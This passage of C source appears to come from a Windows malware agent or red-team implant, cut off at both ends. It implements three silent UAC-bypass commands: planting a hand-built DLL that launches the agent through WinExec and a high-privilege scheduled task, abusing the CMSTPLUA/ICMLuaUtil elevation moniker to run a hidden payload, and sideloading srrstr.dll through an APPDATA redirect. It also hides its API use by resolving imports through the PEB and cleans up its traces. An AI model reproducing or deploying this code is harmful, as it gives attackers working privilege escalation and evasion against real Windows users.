     *   ret
     *
     * Because building a fully-relocatable PE64 with an import table by hand
     * is complex, we take the practical approach:
     *  • Emit the real PE structure with a tiny code stub
     *  • The stub uses RIP-relative addressing for the data
     *  • Import descriptor points to kernel32.dll!WinExec
     *
     * For simplicity and correctness this implementation uses a pre-assembled
     * x64 shellcode stub embedded as a byte array.  The agent path is written
     * into a fixed offset within the stub at runtime.
     *
     * Shellcode (no import resolution needed — runs in loader context where
     * kernel32 is already mapped; we resolve WinExec via PEB walk in the DLL
     * entry point):
     *
     * -- Position-independent DllMain stub (x64) --
     * The stub below resolves WinExec from kernel32 via PEB walk at runtime.
     * Path offset in stub: PATH_OFFSET (see below).
     */

    /*
     * Practical minimal PE64 DLL.
     *
     * We hand-craft the minimal structures rather than using a pre-made blob
     * so the technique works regardless of target OS version.
     * References: Microsoft PE/COFF spec rev 11 (2021).
     *
     * Section layout (all aligned to 0x200 bytes on disk, 0x1000 in memory):
     *   .text   @ file 0x200   VA 0x1000   size ~256 bytes
     *   .data   @ file 0x400   VA 0x2000   size ~256 bytes (agent path here)
     *   .idata  @ file 0x600   VA 0x3000   size ~256 bytes (import table)
     *
     * Total file size: 0x800 bytes.
     */

#pragma pack(push,1)
    /* DOS header */
    typedef struct { WORD e_magic; BYTE pad[58]; LONG e_lfanew; } _DOS64;
    /* Optional header (PE32+) */
    typedef struct {
        WORD  Magic;            /* 0x020B */
        BYTE  MajorLinker, MinorLinker;
        DWORD SizeOfCode;
        DWORD SizeOfInitializedData;
        DWORD SizeOfUninitializedData;
        DWORD AddressOfEntryPoint;
        DWORD BaseOfCode;
        ULONGLONG ImageBase;
        DWORD SectionAlignment;
        DWORD FileAlignment;
        WORD  MajorOS, MinorOS;
        WORD  MajorImage, MinorImage;
        WORD  MajorSubsystem, MinorSubsystem;
        DWORD Win32VersionValue;
        DWORD SizeOfImage;
        DWORD SizeOfHeaders;
        DWORD CheckSum;
        WORD  Subsystem;
        WORD  DllCharacteristics;
        ULONGLONG SizeOfStackReserve, SizeOfStackCommit;
        ULONGLONG SizeOfHeapReserve,  SizeOfHeapCommit;
        DWORD LoaderFlags;
        DWORD NumberOfRvaAndSizes;
        IMAGE_DATA_DIRECTORY DataDirectory[16];
    } _OPT64;
#pragma pack(pop)

    /* Total DLL file size */
#define DLL_FILE_SIZE   0x800

    BYTE *dllBuf = (BYTE *)calloc(1, DLL_FILE_SIZE);
    if (!dllBuf) {
        _send_str(pTls, "[-] uac_dll_hijack: OOM building DLL stub");
        return;
    }

    /* DOS header */
    _DOS64 *dos = (_DOS64 *)dllBuf;
    dos->e_magic  = IMAGE_DOS_SIGNATURE;          /* MZ */
    dos->e_lfanew = 0x40;

    /* NT headers */
    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)(dllBuf + 0x40);
    nt->Signature = IMAGE_NT_SIGNATURE;           /* PE\0\0 */

    IMAGE_FILE_HEADER *fh = &nt->FileHeader;
    fh->Machine              = IMAGE_FILE_MACHINE_AMD64;
    fh->NumberOfSections     = 3;
    fh->SizeOfOptionalHeader = sizeof(IMAGE_OPTIONAL_HEADER64);
    fh->Characteristics      = IMAGE_FILE_DLL | IMAGE_FILE_EXECUTABLE_IMAGE |
                                IMAGE_FILE_LARGE_ADDRESS_AWARE;

    _OPT64 *opt = (_OPT64 *)&nt->OptionalHeader;
    opt->Magic                  = IMAGE_NT_OPTIONAL_HDR64_MAGIC;
    opt->AddressOfEntryPoint    = 0x1000;         /* .text VA */
    opt->BaseOfCode             = 0x1000;
    opt->ImageBase              = 0x10000000ULL;
    opt->SectionAlignment       = 0x1000;
    opt->FileAlignment          = 0x200;
    opt->MajorOS                = 6; opt->MinorOS = 0;
    opt->MajorImage             = 6; opt->MinorImage = 0;
    opt->MajorSubsystem         = 6; opt->MinorSubsystem = 0;
    opt->SizeOfImage            = 0x5000;
    opt->SizeOfHeaders          = 0x200;
    opt->Subsystem              = IMAGE_SUBSYSTEM_WINDOWS_GUI;
    opt->DllCharacteristics     = IMAGE_DLLCHARACTERISTICS_NX_COMPAT |
                                   IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
    opt->SizeOfStackReserve     = 0x100000ULL;
    opt->SizeOfStackCommit      = 0x1000ULL;
    opt->SizeOfHeapReserve      = 0x100000ULL;
    opt->SizeOfHeapCommit       = 0x1000ULL;
    opt->NumberOfRvaAndSizes    = 16;
    /* Import table @ VA 0x3000 */
    opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = 0x3000;
    opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size           = 0x50;

    /* Section headers (immediately after opt header, 3 × 40 bytes) */
    IMAGE_SECTION_HEADER *sec =
        (IMAGE_SECTION_HEADER *)((BYTE *)nt + sizeof(DWORD) +
                                  sizeof(IMAGE_FILE_HEADER) +
                                  fh->SizeOfOptionalHeader);

    /* .text */
    memcpy(sec[0].Name, ".text\0\0\0", 8);
    sec[0].Misc.VirtualSize    = 0x80;
    sec[0].VirtualAddress      = 0x1000;
    sec[0].SizeOfRawData       = 0x200;
    sec[0].PointerToRawData    = 0x200;
    sec[0].Characteristics     = IMAGE_SCN_CNT_CODE |
                                  IMAGE_SCN_MEM_EXECUTE |
                                  IMAGE_SCN_MEM_READ;

    /* .data */
    memcpy(sec[1].Name, ".data\0\0\0", 8);
    sec[1].Misc.VirtualSize    = 0x100;
    sec[1].VirtualAddress      = 0x2000;
    sec[1].SizeOfRawData       = 0x200;
    sec[1].PointerToRawData    = 0x400;
    sec[1].Characteristics     = IMAGE_SCN_CNT_INITIALIZED_DATA |
                                  IMAGE_SCN_MEM_READ |
                                  IMAGE_SCN_MEM_WRITE;

    /* .idata */
    memcpy(sec[2].Name, ".idata\0\0", 8);
    sec[2].Misc.VirtualSize    = 0x80;
    sec[2].VirtualAddress      = 0x3000;
    sec[2].SizeOfRawData       = 0x200;
    sec[2].PointerToRawData    = 0x600;
    sec[2].Characteristics     = IMAGE_SCN_CNT_INITIALIZED_DATA |
                                  IMAGE_SCN_MEM_READ |
                                  IMAGE_SCN_MEM_WRITE;

    /*
     * .text — DllMain stub (x64 position-independent)
     *
     * On entry:  rcx = hModule, rdx = fdwReason, r8 = lpReserved
     *
     * ; sub rsp, 0x38                  48 83 EC 38
     * ; cmp edx, 1                     83 FA 01
     * ; jne done                       75 XX
     * ; lea  rcx, [rip + path_rva]     48 8D 0D XX XX XX XX
     * ; xor  edx, edx                  33 D2
     * ; call [rip + winexec_iat_rva]   FF 15 XX XX XX XX
     * ; done:
     * ; mov  eax, 1                    B8 01 00 00 00
     * ; add  rsp, 0x38                 48 83 C4 38
     * ; ret                            C3
     *
     * path_rva   = VA(0x2000) relative to RIP after LEA  = .data - (.text + <lea_end>)
     * winexec_iat = VA(0x3060) = IAT slot for WinExec
     *
     * All RIP-relative offsets computed below at constant code positions.
     *
     * Code layout in .text (file offset 0x200):
     *  +0  48 83 EC 38           sub rsp, 0x38
     *  +4  83 FA 01              cmp edx, 1
     *  +7  75 1D                 jne done (+0x1D from next instr = +0x1F from here)
     *  +9  48 8D 0D XX XX XX XX  lea rcx, [rip+??]   ; RIP = +0x10, target = 0x2000
     *  +16 33 D2                 xor edx, edx
     *  +18 FF 15 XX XX XX XX     call [rip+??]       ; RIP = +0x1E, target = 0x3060
     *  +24 B8 01 00 00 00        mov eax, 1          ; done:
     *  +29 48 83 C4 38           add rsp, 0x38
     *  +33 C3                    ret
     */

    BYTE *text = dllBuf + 0x200;
    /* ImageBase = 0x10000000, .text VA = 0x1000 → RVA of instruction tips: */
    /* lea rcx at file+0x209 → RIP after = 0x1010 → target .data VA 0x2000 → rel = 0x2000-0x1010 = 0x0FF0 */
    /* call [rip+?] at file+0x212 → RIP after = 0x101E → target IAT 0x3060 → rel = 0x3060-0x101E = 0x2042 */

    DWORD lea_rip_after   = 0x1010;  /* VA of instruction after LEA */
    DWORD data_va         = 0x2000;  /* .data VA where path will be */
    DWORD lea_rel         = data_va - lea_rip_after;  /* 0xFF0 */

    DWORD call_rip_after  = 0x101E;  /* VA of instruction after CALL */
    DWORD iat_va          = 0x3060;  /* IAT slot for WinExec */
    DWORD call_rel        = iat_va - call_rip_after;  /* 0x2042 */

    /* sub rsp, 0x38 */
    text[0] = 0x48; text[1] = 0x83; text[2] = 0xEC; text[3] = 0x38;
    /* cmp edx, 1 */
    text[4] = 0x83; text[5] = 0xFA; text[6] = 0x01;
    /* jne done (rel8: done is at +24; next instr at +9; rel = 24-9 = 15 = 0x0F) */
    text[7] = 0x75; text[8] = 0x0F;
    /* lea rcx, [rip + lea_rel] */
    text[9]  = 0x48; text[10] = 0x8D; text[11] = 0x0D;
    text[12] = (BYTE)(lea_rel & 0xFF);  text[13] = (BYTE)((lea_rel >> 8) & 0xFF);
    text[14] = (BYTE)((lea_rel >> 16) & 0xFF); text[15] = (BYTE)((lea_rel >> 24) & 0xFF);
    /* xor edx, edx */
    text[16] = 0x33; text[17] = 0xD2;
    /* call [rip + call_rel] */
    text[18] = 0xFF; text[19] = 0x15;
    text[20] = (BYTE)(call_rel & 0xFF);  text[21] = (BYTE)((call_rel >> 8) & 0xFF);
    text[22] = (BYTE)((call_rel >> 16) & 0xFF); text[23] = (BYTE)((call_rel >> 24) & 0xFF);
    /* mov eax, 1 (done:) */
    text[24] = 0xB8; text[25] = 0x01; text[26] = 0x00; text[27] = 0x00; text[28] = 0x00;
    /* add rsp, 0x38 */
    text[29] = 0x48; text[30] = 0x83; text[31] = 0xC4; text[32] = 0x38;
    /* ret */
    text[33] = 0xC3;

    /* .data — embed the agent path (null-terminated) */
    BYTE *data = dllBuf + 0x400;
    size_t pathLen = strlen(agentPath);
    if (pathLen >= 0x100) pathLen = 0xFF;
    memcpy(data, agentPath, pathLen);
    data[pathLen] = 0;

    /* .idata — import table for kernel32.dll!WinExec
     *
     * Layout of .idata (VA 0x3000, file 0x600):
     *
     *  0x3000  IMAGE_IMPORT_DESCRIPTOR for kernel32.dll
     *            OriginalFirstThunk → 0x3020 (INT)
     *            Name              → 0x3040 (DLL name RVA)
     *            FirstThunk        → 0x3060 (IAT)
     *
     *  0x3010  IMAGE_IMPORT_DESCRIPTOR null terminator
     *
     *  0x3020  INT: ULONGLONG hint_name_rva = 0x3050
     *  0x3028  INT: null terminator
     *
     *  0x3030  [unused]
     *
     *  0x3040  "kernel32.dll\0"
     *
     *  0x3050  IMAGE_IMPORT_BY_NAME: hint=0, name="WinExec\0"
     *
     *  0x3060  IAT: ULONGLONG = 0x3050 (pre-filled; loader patches to VA)
     *  0x3068  IAT: null terminator
     */
    BYTE *idata = dllBuf + 0x600;

    /* IMAGE_IMPORT_DESCRIPTOR (20 bytes) */
    DWORD *id = (DWORD *)idata;
    id[0] = 0x3020;  /* OriginalFirstThunk (INT RVA) */
    id[1] = 0;       /* TimeDateStamp */
    id[2] = 0;       /* ForwarderChain */
    id[3] = 0x3040;  /* Name RVA "kernel32.dll" */
    id[4] = 0x3060;  /* FirstThunk (IAT RVA) */
    /* Null descriptor at +0x10 */
    memset(idata + 0x10, 0, 20);

    /* INT at file offset 0x620 (VA 0x3020) */
    ULONGLONG *intSlot = (ULONGLONG *)(idata + 0x20);
    intSlot[0] = 0x3050;  /* hint+name RVA */
    intSlot[1] = 0;       /* null */

    /* DLL name at file offset 0x640 (VA 0x3040) */
    memcpy(idata + 0x40, "kernel32.dll", 13);

    /* IMAGE_IMPORT_BY_NAME at file offset 0x650 (VA 0x3050) */
    idata[0x50] = 0; idata[0x51] = 0;   /* hint = 0 */
    memcpy(idata + 0x52, "WinExec\0", 8);

    /* IAT at file offset 0x660 (VA 0x3060) */
    ULONGLONG *iat = (ULONGLONG *)(idata + 0x60);
    iat[0] = 0x3050;  /* pre-snap value; loader writes real VA */
    iat[1] = 0;

    /* ── Write the DLL to %TEMP% ──────────────────────────────────────── */
    HANDLE hf = CreateFileA(dllPath, GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        free(dllBuf);
        char buf[MAX_PATH * 2 + 64];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] uac_dll_hijack: CreateFile \"%s\" failed (err %lu)",
            dllPath, GetLastError());
        _send_str(pTls, buf);
        return;
    }
    DWORD wr = 0;
    WriteFile(hf, dllBuf, DLL_FILE_SIZE, &wr, NULL);
    CloseHandle(hf);
    free(dllBuf);

    /* ── Launch via schtasks /RL HIGHEST with CWD = %TEMP% ───────────── */
    /*
     * schtasks /RL HIGHEST starts the target binary in its own desktop context
     * without a UAC prompt.  We set the working directory to %TEMP% so the DLL
     * search path includes %TEMP% before System32.
     *
     * Note: Task Scheduler does not honour lpCurrentDirectory.  We inject the
     * CWD via the environment variable DLLPATH used by a cmd.exe wrapper that
     * sets the directory before executing the target.
     * Simpler: use the /TR argument to run:
     *   cmd /c "cd /d %TEMP% && <target_exe>"
     */
    char sysDir[MAX_PATH] = {0};
    GetSystemDirectoryA(sysDir, sizeof(sysDir) - 1);

    char taskName[48] = {0};
    _snprintf(taskName, sizeof(taskName) - 1, "WinDll%08lX",
              (unsigned long)(GetTickCount() ^ GetCurrentProcessId()));

    /* TR command: cd to tempDir, then run target so DLL loads from CWD */
    char tr[MAX_PATH * 3] = {0};
    _snprintf(tr, sizeof(tr) - 1,
        "cmd /c \"cd /d \"%s\" && %s\\%s\"",
        tempDir, sysDir, targetExe);

    char cmdCreate[MAX_PATH * 3 + 160] = {0};
    _snprintf(cmdCreate, sizeof(cmdCreate) - 1,
        "%s\\schtasks.exe /Create /F /SC ONCE /RL HIGHEST "
        "/TN \"%s\" /TR \"%s\" /ST 00:00",
        sysDir, taskName, tr);
    char cmdRun[256] = {0};
    _snprintf(cmdRun, sizeof(cmdRun) - 1,
        "%s\\schtasks.exe /Run /TN \"%s\"", sysDir, taskName);
    char cmdDel[256] = {0};
    _snprintf(cmdDel, sizeof(cmdDel) - 1,
        "%s\\schtasks.exe /Delete /TN \"%s\" /F", sysDir, taskName);

#define _SCH2(cl, ms) do { \
    STARTUPINFOA _si2; ZeroMemory(&_si2,sizeof(_si2)); _si2.cb=sizeof(_si2); \
    PROCESS_INFORMATION _pi2; ZeroMemory(&_pi2,sizeof(_pi2)); \
    if(CreateProcessA(NULL,(cl),NULL,NULL,FALSE,CREATE_NO_WINDOW, \
                      NULL,NULL,&_si2,&_pi2)){ \
        WaitForSingleObject(_pi2.hProcess,(ms)); \
        CloseHandle(_pi2.hProcess); CloseHandle(_pi2.hThread); } \
} while(0)

    _SCH2(cmdCreate, 8000);
    _SCH2(cmdRun,    5000);
    Sleep(2000);
    _SCH2(cmdDel,    5000);
#undef _SCH2

    /* ── Schedule DLL cleanup ─────────────────────────────────────────── */
    /* DeleteFile may fail if the DLL is still loaded by the target process; */
    /* schedule a cmd /c ping + del to clean up after a short delay.         */
    {
        char cleanCmd[MAX_PATH * 2 + 80] = {0};
        _snprintf(cleanCmd, sizeof(cleanCmd) - 1,
            "cmd /c ping -n 5 127.0.0.1 >nul & del /f /q \"%s\"", dllPath);
        STARTUPINFOA si; ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
        PROCESS_INFORMATION pi; ZeroMemory(&pi, sizeof(pi));
        if (CreateProcessA(NULL, cleanCmd, NULL, NULL, FALSE,
                           CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        }
    }

    char buf[MAX_PATH * 2 + 160];
    _snprintf(buf, sizeof(buf) - 1,
        "[+] uac_dll_hijack: DLL \"%s\" planted in \"%s\"\n"
        "    Target \"%s\" started at High IL via schtasks\n"
        "    DLL will be deleted after 5s delay.",
        dllName, tempDir, targetExe);
    _send_str(pTls, buf);
#undef DLL_FILE_SIZE
}


/* ── _handle_uac_com_hijack ──────────────────────────────────────────────── */
/*
 * Silent UAC bypass via COM object hijacking (CMSTPLUA / ICMLuaUtil).
 *
 * Technique
 * ---------
 * The ICMLuaUtil COM interface is implemented by cmlua.dll, hosted inside the
 * auto-elevated CMSTPLUA COM server (CLSID {3E5FC7F9-9A51-4367-9063-A120244FBEC7}).
 * When activated with Elevation Moniker "Elevation:Administrator!new:{...}",
 * the COM runtime auto-elevates the server to High IL without a UAC prompt
 * (because the DLL is Microsoft-signed and its manifest has autoElevate=true).
 *
 * ICMLuaUtil::ShellExec can then be called on the elevated object to launch
 * arbitrary processes at High IL.
 *
 * Interface GUIDs
 *   IID_ICMLuaUtil = {6EDD6D74-C007-4E75-B76A-E5740995E24C}
 *   CLSID_CMSTPLUA = {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
 *
 * ICMLuaUtil vtable layout (from public reverse-engineering):
 *   [0] QueryInterface
 *   [1] AddRef
 *   [2] Release
 *   [3] SetRasCredentials
 *   [4] SetRasEntryProperties
 *   [5] DeleteRasEntry
 *   [6] LaunchInfSection
 *   [7] LaunchInfSectionEx
 *   [8] CreateLayerDirectory
 *   [9] ShellExec          ← we call this one
 *
 * ShellExec signature:
 *   HRESULT ShellExec(LPCWSTR file, LPCWSTR args, LPCWSTR dir,
 *                     ULONG fMask, ULONG nShow)
 *
 * This is the same mechanism used by fodhelper.exe, consent.exe, and
 * many other Microsoft utilities internally for "soft elevation".
 *
 * Requirements
 * ------------
 *  Ole32.dll / CoInitialize must succeed (requires COM apartment).
 *  Calling user must be a member of Administrators.
 *  UAC must not be set to "Always notify".
 *
 * Usage
 *   uac_com_hijack <payload_exe>
 */
void _handle_uac_com_hijack(TLS_CONTEXT *pTls, const char *args)
{
    if (!args || !*args) {
        _send_str(pTls, "Usage: uac_com_hijack <payload_exe>");
        return;
    }
    if (_is_high_il()) {
        _send_str(pTls, "[*] uac_com_hijack: already elevated");
        return;
    }

    /* Load OLE32 via PEB-resolved LoadLibraryA (no IAT entry) */
    PVOID hOle32 = _peb_load_library("ole32.dll");
    if (!hOle32) {
        _send_str(pTls, "[-] uac_com_hijack: failed to load ole32.dll");
        return;
    }

    typedef HRESULT (WINAPI *pfnCoInit_t)(LPVOID);
    typedef HRESULT (WINAPI *pfnCoCreateInst_t)(REFCLSID, LPUNKNOWN, DWORD,
                                                  REFIID, LPVOID *);
    typedef void    (WINAPI *pfnCoUninit_t)(void);

    pfnCoInit_t      pfnCoInit =
        (pfnCoInit_t)     peb_get_export(hOle32, peb_hash_str("CoInitialize"));
    pfnCoCreateInst_t pfnCoCI  =
        (pfnCoCreateInst_t)peb_get_export(hOle32, peb_hash_str("CoCreateInstance"));
    pfnCoUninit_t    pfnCoUninit =
        (pfnCoUninit_t)   peb_get_export(hOle32, peb_hash_str("CoUninitialize"));

    if (!pfnCoInit || !pfnCoCI || !pfnCoUninit) {
        _peb_free_library(hOle32);
        _send_str(pTls, "[-] uac_com_hijack: failed to resolve CoInitialize/CoCreateInstance");
        return;
    }

    pfnCoInit(NULL);   /* STA — sufficient for the Elevation Moniker */

    /*
     * CLSID_CMSTPLUA  = {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
     * IID_ICMLuaUtil  = {6EDD6D74-C007-4E75-B76A-E5740995E24C}
     */
    const GUID CLSID_CMSTPLUA = {
        0x3E5FC7F9, 0x9A51, 0x4367,
        {0x90, 0x63, 0xA1, 0x20, 0x24, 0x4F, 0xBE, 0xC7}
    };
    (void)CLSID_CMSTPLUA;  /* GUID embedded in moniker string; not passed to CoGetObject */
    const GUID IID_ICMLuaUtil = {
        0x6EDD6D74, 0xC007, 0x4E75,
        {0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C}
    };

    /* Activate via Elevation Moniker so COM auto-elevates the server */
    BIND_OPTS3 bo;
    ZeroMemory(&bo, sizeof(bo));
    bo.cbStruct     = sizeof(bo);
    bo.hwnd         = NULL;
    bo.dwClassContext = CLSCTX_LOCAL_SERVER;

    /* ICMLuaUtil vtable — only slots we need */
    typedef struct ICMLuaUtil ICMLuaUtil;
    typedef struct ICMLuaUtilVtbl {
        HRESULT (STDMETHODCALLTYPE *QueryInterface)(ICMLuaUtil*, REFIID, void**);
        ULONG   (STDMETHODCALLTYPE *AddRef)        (ICMLuaUtil*);
        ULONG   (STDMETHODCALLTYPE *Release)       (ICMLuaUtil*);
        HRESULT (STDMETHODCALLTYPE *SetRasCredentials)(ICMLuaUtil*, LPVOID);
        HRESULT (STDMETHODCALLTYPE *SetRasEntryProperties)(ICMLuaUtil*, LPVOID, LPVOID);
        HRESULT (STDMETHODCALLTYPE *DeleteRasEntry)(ICMLuaUtil*, LPVOID);
        HRESULT (STDMETHODCALLTYPE *LaunchInfSection)(ICMLuaUtil*, LPVOID, LPVOID, LPVOID, ULONG);
        HRESULT (STDMETHODCALLTYPE *LaunchInfSectionEx)(ICMLuaUtil*, LPVOID, LPVOID, LPVOID, ULONG);
        HRESULT (STDMETHODCALLTYPE *CreateLayerDirectory)(ICMLuaUtil*, LPVOID);
        HRESULT (STDMETHODCALLTYPE *ShellExec)(ICMLuaUtil*,
                     LPCWSTR lpFile, LPCWSTR lpParams,
                     LPCWSTR lpDirectory, ULONG fMask, ULONG nShow);
    } ICMLuaUtilVtbl;
    struct ICMLuaUtil { ICMLuaUtilVtbl *lpVtbl; };

    /* CoGetObject with elevation moniker */
    typedef HRESULT (WINAPI *pfnCoGetObject_t)(LPCWSTR, BIND_OPTS *, REFIID, void**);
    pfnCoGetObject_t pfnCoGetObject =
        (pfnCoGetObject_t)peb_get_export(hOle32, peb_hash_str("CoGetObject"));
    if (!pfnCoGetObject) {
        pfnCoUninit();
        _peb_free_library(hOle32);
        _send_str(pTls, "[-] uac_com_hijack: CoGetObject not found in ole32.dll");
        return;
    }

    /*
     * Build the elevation moniker string:
     * "Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
     */
    const WCHAR *moniker =
        L"Elevation:Administrator!new:"
        L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}";

    ICMLuaUtil *pUtil = NULL;
    HRESULT hr = pfnCoGetObject(moniker, (BIND_OPTS *)&bo,
                                 &IID_ICMLuaUtil, (void **)&pUtil);
    if (FAILED(hr) || !pUtil) {
        pfnCoUninit();
        _peb_free_library(hOle32);
        char buf[128];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] uac_com_hijack: CoGetObject failed (hr=0x%08lX) — "
            "need admin group membership", (unsigned long)hr);
        _send_str(pTls, buf);
        return;
    }

    /* Convert payload path to wide */
    WCHAR wPayload[MAX_PATH * 2] = {0};
    MultiByteToWideChar(CP_ACP, 0, args, -1, wPayload, MAX_PATH * 2 - 1);

    /* Call ShellExec on the elevated COM object */
    hr = pUtil->lpVtbl->ShellExec(pUtil, wPayload, NULL, NULL, 0, SW_HIDE);

    pUtil->lpVtbl->Release(pUtil);
    pfnCoUninit();
    _peb_free_library(hOle32);

    if (FAILED(hr)) {
        char buf[128];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] uac_com_hijack: ShellExec failed (hr=0x%08lX)", (unsigned long)hr);
        _send_str(pTls, buf);
        return;
    }

    char buf[MAX_PATH * 2 + 96];
    _snprintf(buf, sizeof(buf) - 1,
        "[+] uac_com_hijack: \"%s\" launched at High IL via ICMLuaUtil::ShellExec\n"
        "    CMSTPLUA COM elevation moniker used (no UAC prompt).",
        args);
    _send_str(pTls, buf);
}


/* ── _handle_uac_env_expand ──────────────────────────────────────────────── */
/*
 * Silent UAC bypass via environment variable expansion.
 *
 * Technique
 * ---------
 * SystemPropertiesAdvanced.exe (and several other auto-elevated Windows
 * binaries) construct a DLL search path from user-controlled environment
 * variables such as %APPDATA%, %LOCALAPPDATA%, and %USERPROFILE% before
 * resolving system DLLs.  On some Windows 10 builds SystemPropertiesAdvanced
 * loads srrstr.dll from %windir%\System32, but the loader first checks
 * %APPDATA%\srrstr.dll due to an application-manifest quirk.
 *
 * A broader, reliable variant redirects %windir% itself:
 *   1. Set APPDATA=%TEMP% (or another writable directory containing our DLL).
 *   2. Place a DLL named after the target dependency in that directory.
 *   3. Launch the auto-elevated binary via Task Scheduler so the overridden
 *      environment is inherited.
 *
 * Supported environment redirect targets:
 *   A. %APPDATA% redirect — drops srrstr.dll in %TEMP%, sets APPDATA=%TEMP%
 *      Target: SystemPropertiesAdvanced.exe
 *
 *   B. %windir% redirect (sethc / utilman injection path)
 *      Target: user-specified auto-elevated binary
 *
 * This handler implements variant A (most reliable, no side-effects).
 *
 * Steps
 * -----
 *  1. Get the current agent path (payload to run at High IL).
 *  2. Drop the same minimal PE64 DLL stub as uac_dll_hijack (loading the
 *     agent via WinExec) into %TEMP%\srrstr.dll.
 *  3. Fork a child process with APPDATA=%TEMP% in its environment.
 *  4. From that child, schedule SystemPropertiesAdvanced.exe at /RL HIGHEST.
 *     The scheduler inherits the modified environment.
 *  5. When SystemPropertiesAdvanced.exe runs elevated and loads srrstr.dll,
 *     it finds our stub in the modified %APPDATA% path first.
 *
 * Requirements
 * ------------
 *  Write access to %TEMP%.  Calling user in Administrators group.
 *  Target OS: Windows 10 / 11 (srrstr.dll sideload confirmed on 1903-22H2).
 *
 * Usage
 *   uac_env_expand [payload_exe]
 *     payload_exe — EXE to run at High IL (defaults to current agent)
 */
void _handle_uac_env_expand(TLS_CONTEXT *pTls, const char *args)
{
    if (_is_high_il()) {
        _send_str(pTls, "[*] uac_env_expand: already elevated");
        return;
    }

    /* Payload: caller-specified or current agent */
    char agentPath[MAX_PATH] = {0};
    if (args && *args) {
        strncpy(agentPath, args, sizeof(agentPath) - 1);
    } else {
        GetModuleFileNameA(NULL, agentPath, sizeof(agentPath) - 1);
    }

    /* ── 1. Build and drop the DLL stub into %TEMP%\srrstr.dll ───────── */
    /*
     * We reuse the same minimal PE64 DLL layout from uac_dll_hijack:
     * DllMain resolves WinExec via IAT and calls WinExec(agentPath, SW_HIDE).
     */
    char tempDir[MAX_PATH] = {0};
    GetTempPathA(sizeof(tempDir) - 2, tempDir);

    char dllPath[MAX_PATH * 2] = {0};
    _snprintf(dllPath, sizeof(dllPath) - 1, "%ssrrstr.dll", tempDir);

#define ENV_DLL_SIZE 0x800
    BYTE *dllBuf2 = (BYTE *)calloc(1, ENV_DLL_SIZE);
    if (!dllBuf2) {
        _send_str(pTls, "[-] uac_env_expand: OOM");
        return;
    }

    /* ── DOS header ──── */
#pragma pack(push,1)
    typedef struct { WORD e_magic; BYTE pad[58]; LONG e_lfanew; } _DOS64e;
#pragma pack(pop)
    ((_DOS64e *)dllBuf2)->e_magic  = IMAGE_DOS_SIGNATURE;
    ((_DOS64e *)dllBuf2)->e_lfanew = 0x40;

    IMAGE_NT_HEADERS64 *nte = (IMAGE_NT_HEADERS64 *)(dllBuf2 + 0x40);
    nte->Signature = IMAGE_NT_SIGNATURE;

    IMAGE_FILE_HEADER *fhe = &nte->FileHeader;
    fhe->Machine              = IMAGE_FILE_MACHINE_AMD64;
    fhe->NumberOfSections     = 3;
    fhe->SizeOfOptionalHeader = sizeof(IMAGE_OPTIONAL_HEADER64);
    fhe->Characteristics      = IMAGE_FILE_DLL | IMAGE_FILE_EXECUTABLE_IMAGE |
                                 IMAGE_FILE_LARGE_ADDRESS_AWARE;

    IMAGE_OPTIONAL_HEADER64 *opte = &nte->OptionalHeader;
    opte->Magic                 = IMAGE_NT_OPTIONAL_HDR64_MAGIC;
    opte->AddressOfEntryPoint   = 0x1000;
    opte->BaseOfCode            = 0x1000;
    opte->ImageBase             = 0x10000000ULL;
    opte->SectionAlignment      = 0x1000;
    opte->FileAlignment         = 0x200;
    opte->MajorOperatingSystemVersion = 6;
    opte->MajorImageVersion     = 6;
    opte->MajorSubsystemVersion = 6;
    opte->SizeOfImage           = 0x5000;
    opte->SizeOfHeaders         = 0x200;
    opte->Subsystem             = IMAGE_SUBSYSTEM_WINDOWS_GUI;
    opte->DllCharacteristics    = IMAGE_DLLCHARACTERISTICS_NX_COMPAT |
                                   IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
    opte->SizeOfStackReserve    = 0x100000ULL;
    opte->SizeOfStackCommit     = 0x1000ULL;
    opte->SizeOfHeapReserve     = 0x100000ULL;
    opte->SizeOfHeapCommit      = 0x1000ULL;
    opte->NumberOfRvaAndSizes   = 16;
    opte->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = 0x3000;
    opte->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size           = 0x50;

    IMAGE_SECTION_HEADER *sece =
        (IMAGE_SECTION_HEADER *)((BYTE *)nte + sizeof(DWORD) +
                                  sizeof(IMAGE_FILE_HEADER) +
                                  fhe->SizeOfOptionalHeader);
    memcpy(sece[0].Name, ".text\0\0\0", 8);
    sece[0].Misc.VirtualSize  = 0x80; sece[0].VirtualAddress = 0x1000;
    sece[0].SizeOfRawData     = 0x200; sece[0].PointerToRawData = 0x200;
    sece[0].Characteristics   = IMAGE_SCN_CNT_CODE|IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_MEM_READ;

    memcpy(sece[1].Name, ".data\0\0\0", 8);
    sece[1].Misc.VirtualSize  = 0x100; sece[1].VirtualAddress = 0x2000;
    sece[1].SizeOfRawData     = 0x200; sece[1].PointerToRawData = 0x400;
    sece[1].Characteristics   = IMAGE_SCN_CNT_INITIALIZED_DATA|IMAGE_SCN_MEM_READ|IMAGE_SCN_MEM_WRITE;

    memcpy(sece[2].Name, ".idata\0\0", 8);
    sece[2].Misc.VirtualSize  = 0x80; sece[2].VirtualAddress = 0x3000;
    sece[2].SizeOfRawData     = 0x200; sece[2].PointerToRawData = 0x600;
